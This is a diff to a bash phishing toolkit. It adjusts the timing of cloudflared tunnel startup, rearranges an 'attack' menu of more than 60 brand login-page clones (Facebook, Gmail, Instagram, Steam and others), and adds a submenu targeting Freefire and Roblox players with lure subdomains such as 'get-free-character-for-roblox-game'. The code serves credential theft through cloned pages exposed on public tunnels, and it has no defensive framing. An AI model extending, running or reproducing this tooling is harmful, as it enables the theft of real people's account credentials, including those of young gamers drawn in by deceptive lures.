@@ -530,7 +530,7 @@ cloudflared_start() {
         sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
     fi
 
-	{ sleep 9; clear; header; }
+	{ sleep 12; clear; header; }
 	
 	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
 	cldflr_url1=${cldflr_url#https://}
@@ -562,7 +562,7 @@ cloudflared_start_manual() {
         sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
     fi
 
-	{ sleep 9; clear; header; }
+	{ sleep 12; clear; header; }
 	
 	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
 	cldflr_url1=${cldflr_url#https://}
@@ -844,30 +844,30 @@ attack() {
  { clear; header; echo; }
 
 	cat <<- EOF
-		${GREEN}[${WHITE}1${GREEN}]${CYAN} Adobe                 ${GREEN}[${WHITE}25${GREEN}]${CYAN} Line           ${GREEN}[${WHITE}48${GREEN}]${CYAN} Socialclub                                        
-		${GREEN}[${WHITE}2${GREEN}]${CYAN} Amazon                ${GREEN}[${WHITE}26${GREEN}]${CYAN} LinkedIn       ${GREEN}[${WHITE}49${GREEN}]${CYAN} Spotify                                                          
-		${GREEN}[${WHITE}3${GREEN}]${CYAN} Apple                 ${GREEN}[${WHITE}27${GREEN}]${CYAN} Livejournal    ${GREEN}[${WHITE}50${GREEN}]${CYAN} Stackoverflow                                                         
-		${GREEN}[${WHITE}4${GREEN}]${CYAN} Baddo                 ${GREEN}[${WHITE}28${GREEN}]${CYAN} Mediafire      ${GREEN}[${WHITE}51${GREEN}]${CYAN} Steam                                                    
-		${GREEN}[${WHITE}5${GREEN}]${CYAN} Care2                 ${GREEN}[${WHITE}29${GREEN}]${CYAN} MeWe           ${GREEN}[${WHITE}52${GREEN}]${CYAN} Tagged                                      
-		${GREEN}[${WHITE}6${GREEN}]${CYAN} Clashofclans          ${GREEN}[${WHITE}30${GREEN}]${CYAN} Microsoft      ${GREEN}[${WHITE}53${GREEN}]${CYAN} Telegram                           
-		${GREEN}[${WHITE}7${GREEN}]${CYAN} Crunchyroll           ${GREEN}[${WHITE}31${GREEN}]${CYAN} Mocospace      ${GREEN}[${WHITE}54${GREEN}]${CYAN} Tiktok                    
-		${GREEN}[${WHITE}8${GREEN}]${CYAN} Deviantart            ${GREEN}[${WHITE}32${GREEN}]${CYAN} Myspace        ${GREEN}[${WHITE}55${GREEN}]${CYAN} Tiktok Followers              
-		${GREEN}[${WHITE}9${GREEN}]${CYAN} Discord               ${GREEN}[${WHITE}33${GREEN}]${CYAN} Netflix        ${GREEN}[${WHITE}56${GREEN}]${CYAN} Tumblr               
-		${GREEN}[${WHITE}10${GREEN}]${CYAN} Dota2                ${GREEN}[${WHITE}34${GREEN}]${CYAN} Origin         ${GREEN}[${WHITE}57${GREEN}]${CYAN} Twitch                     
-		${GREEN}[${WHITE}11${GREEN}]${CYAN} Dropbox              ${GREEN}[${WHITE}35${GREEN}]${CYAN} Outlook        ${GREEN}[${WHITE}58${GREEN}]${CYAN} Twitter           
-		${GREEN}[${WHITE}12${GREEN}]${CYAN} Ebay                 ${GREEN}[${WHITE}36${GREEN}]${CYAN} Pinterest      ${GREEN}[${WHITE}59${GREEN}]${CYAN} Viber Out                     
-		${GREEN}[${WHITE}13${GREEN}]${CYAN} Facebook             ${GREEN}[${WHITE}37${GREEN}]${CYAN} Playstation    ${GREEN}[${WHITE}60${GREEN}]${CYAN} Vimeo                        
-		${GREEN}[${WHITE}14${GREEN}]${CYAN} Facebook Messenger   ${GREEN}[${WHITE}38${GREEN}]${CYAN} Protonmail     ${GREEN}[${WHITE}61${GREEN}]${CYAN} Vk                     
-		${GREEN}[${WHITE}15${GREEN}]${CYAN} Facebook Security    ${GREEN}[${WHITE}49${GREEN}]${CYAN} Pubg           ${GREEN}[${WHITE}62${GREEN}]${CYAN} Whatsapp                    
-		${GREEN}[${WHITE}16${GREEN}]${CYAN} Gmail                ${GREEN}[${WHITE}40${GREEN}]${CYAN} Quora          ${GREEN}[${WHITE}63${GREEN}]${CYAN} Wordpress       
-		${GREEN}[${WHITE}17${GREEN}]${CYAN} Goodreads            ${GREEN}[${WHITE}41${GREEN}]${CYAN} Reverly        ${GREEN}[${WHITE}64${GREEN}]${CYAN} Xanga     
-		${GREEN}[${WHITE}18${GREEN}]${CYAN} Hotstar              ${GREEN}[${WHITE}42${GREEN}]${CYAN} Reddit         ${GREEN}[${WHITE}65${GREEN}]${CYAN} Xbox                                               
-		${GREEN}[${WHITE}19${GREEN}]${CYAN} Icloud               ${GREEN}[${WHITE}43${GREEN}]${CYAN} Reverbnation   ${GREEN}[${WHITE}66${GREEN}]${CYAN} Xing                                                     
-		${GREEN}[${WHITE}20${GREEN}]${CYAN} Influenster          ${GREEN}[${WHITE}44${GREEN}]${CYAN} Signal         ${GREEN}[${WHITE}67${GREEN}]${CYAN} Yahoo
-		${GREEN}[${WHITE}21${GREEN}]${CYAN} Instagram            ${GREEN}[${WHITE}45${GREEN}]${CYAN} Skype          ${GREEN}[${WHITE}68${GREEN}]${CYAN} Yandex
-		${GREEN}[${WHITE}22${GREEN}]${CYAN} Insta Followers      ${GREEN}[${WHITE}46${GREEN}]${CYAN} Skyrock        ${GREEN}[${WHITE}69${GREEN}]${CYAN} Youtube SUbs
+		${GREEN}[${WHITE}1${GREEN}]${CYAN} Adobe                 ${GREEN}[${WHITE}25${GREEN}]${CYAN} Line           ${GREEN}[${WHITE}49${GREEN}]${CYAN} Spotify                                         
+		${GREEN}[${WHITE}2${GREEN}]${CYAN} Amazon                ${GREEN}[${WHITE}26${GREEN}]${CYAN} LinkedIn       ${GREEN}[${WHITE}50${GREEN}]${CYAN} Stackoverflow                                                          
+		${GREEN}[${WHITE}3${GREEN}]${CYAN} Apple                 ${GREEN}[${WHITE}27${GREEN}]${CYAN} Livejournal    ${GREEN}[${WHITE}51${GREEN}]${CYAN} Steam                                                        
+		${GREEN}[${WHITE}4${GREEN}]${CYAN} Baddo                 ${GREEN}[${WHITE}28${GREEN}]${CYAN} Mediafire      ${GREEN}[${WHITE}52${GREEN}]${CYAN} Tagged                                                    
+		${GREEN}[${WHITE}5${GREEN}]${CYAN} Care2                 ${GREEN}[${WHITE}29${GREEN}]${CYAN} MeWe           ${GREEN}[${WHITE}53${GREEN}]${CYAN} Telegram                                      
+		${GREEN}[${WHITE}6${GREEN}]${CYAN} Clashofclans          ${GREEN}[${WHITE}30${GREEN}]${CYAN} Microsoft      ${GREEN}[${WHITE}54${GREEN}]${CYAN} Tiktok                            
+		${GREEN}[${WHITE}7${GREEN}]${CYAN} Crunchyroll           ${GREEN}[${WHITE}31${GREEN}]${CYAN} Mocospace      ${GREEN}[${WHITE}55${GREEN}]${CYAN} Tiktok Followers                    
+		${GREEN}[${WHITE}8${GREEN}]${CYAN} Deviantart            ${GREEN}[${WHITE}32${GREEN}]${CYAN} Myspace        ${GREEN}[${WHITE}56${GREEN}]${CYAN} Tumblr             
+		${GREEN}[${WHITE}9${GREEN}]${CYAN} Discord               ${GREEN}[${WHITE}33${GREEN}]${CYAN} Netflix        ${GREEN}[${WHITE}57${GREEN}]${CYAN} Twitch                
+		${GREEN}[${WHITE}10${GREEN}]${CYAN} Dota2                ${GREEN}[${WHITE}34${GREEN}]${CYAN} Origin         ${GREEN}[${WHITE}58${GREEN}]${CYAN} Twitter                    
+		${GREEN}[${WHITE}11${GREEN}]${CYAN} Dropbox              ${GREEN}[${WHITE}35${GREEN}]${CYAN} Outlook        ${GREEN}[${WHITE}59${GREEN}]${CYAN} Viber Out            
+		${GREEN}[${WHITE}12${GREEN}]${CYAN} Ebay                 ${GREEN}[${WHITE}36${GREEN}]${CYAN} Pinterest      ${GREEN}[${WHITE}60${GREEN}]${CYAN} Vimeo                    
+		${GREEN}[${WHITE}13${GREEN}]${CYAN} Facebook             ${GREEN}[${WHITE}37${GREEN}]${CYAN} Playstation    ${GREEN}[${WHITE}61${GREEN}]${CYAN} Vk                        
+		${GREEN}[${WHITE}14${GREEN}]${CYAN} Facebook Messenger   ${GREEN}[${WHITE}38${GREEN}]${CYAN} Protonmail     ${GREEN}[${WHITE}62${GREEN}]${CYAN} Whatsapp                   
+		${GREEN}[${WHITE}15${GREEN}]${CYAN} Facebook Security    ${GREEN}[${WHITE}49${GREEN}]${CYAN} Pubg           ${GREEN}[${WHITE}63${GREEN}]${CYAN} Wordpress                    
+		${GREEN}[${WHITE}16${GREEN}]${CYAN} Gmail                ${GREEN}[${WHITE}40${GREEN}]${CYAN} Quora          ${GREEN}[${WHITE}64${GREEN}]${CYAN} Xanga       
+		${GREEN}[${WHITE}17${GREEN}]${CYAN} Goodreads            ${GREEN}[${WHITE}41${GREEN}]${CYAN} Reverly        ${GREEN}[${WHITE}65${GREEN}]${CYAN} Xbox     
+		${GREEN}[${WHITE}18${GREEN}]${CYAN} Hotstar              ${GREEN}[${WHITE}42${GREEN}]${CYAN} Reddit         ${GREEN}[${WHITE}66${GREEN}]${CYAN} Xing                                               
+		${GREEN}[${WHITE}19${GREEN}]${CYAN} Icloud               ${GREEN}[${WHITE}43${GREEN}]${CYAN} Reverbnation   ${GREEN}[${WHITE}67${GREEN}]${CYAN} Yahoo                                                     
+		${GREEN}[${WHITE}20${GREEN}]${CYAN} Influenster          ${GREEN}[${WHITE}44${GREEN}]${CYAN} Signal         ${GREEN}[${WHITE}68${GREEN}]${CYAN} Yandex
+		${GREEN}[${WHITE}21${GREEN}]${CYAN} Instagram            ${GREEN}[${WHITE}45${GREEN}]${CYAN} Skype          ${GREEN}[${WHITE}69${GREEN}]${CYAN} Youtube SUbs
+		${GREEN}[${WHITE}22${GREEN}]${CYAN} Insta Followers      ${GREEN}[${WHITE}46${GREEN}]${CYAN} Skyrock        ${GREEN}[${WHITE}02${GREEN}]${CYAN} Others
 		${GREEN}[${WHITE}23${GREEN}]${CYAN} Insta Followers 2    ${GREEN}[${WHITE}47${GREEN}]${CYAN} Snapchat       ${GREEN}[${WHITE}99${GREEN}]${MAGENTA} Main Menu
-		${GREEN}[${WHITE}24${GREEN}]${CYAN} Instagram Verify
+		${GREEN}[${WHITE}24${GREEN}]${CYAN} Instagram Verify     ${GREEN}[${WHITE}48${GREEN}]${CYAN} Socialclub                                                    
 		
 		
 	EOF
@@ -1287,9 +1287,8 @@ attack() {
 			tunnel;;	
 			
 	
-	   #70)  
-	        #setup_clone_manual
-	        #tunnel;;
+	   02)  
+	        other_sites;;
 	        
 	        
 	   99) menu;;
@@ -1303,6 +1302,57 @@ attack() {
 
 
 }
+
+
+
+
+other_sites() {
+ 
+ { clear; header; echo; }
+
+	cat <<- EOF
+		${GREEN}[${WHITE}1${GREEN}]${CYAN} Freefire
+		${GREEN}[${WHITE}2${GREEN}]${CYAN} Roblox
+		${GREEN}[${WHITE}99${GREEN}]${MAGENTA} Main Menu                                         
+		                                                       
+
+		
+		
+	EOF
+	
+	
+	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}
+
+	case $REPLY in 
+	
+	    1)
+			site="freefire"
+			subdomain='http://get-free-character-for-freefire-game'
+			tunnel;;
+			
+			
+	    2)
+			site="roblox"
+			subdomain='http://get-free-character-for-roblox-game'
+			tunnel;;
+				
+	        
+	        
+	   99) menu;;
+	    
+	        
+	   *)
+			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
+			{ sleep 0.7; other_sites;};;
+	  
+	esac
+
+
+}
+
+
+
+
 
 
 
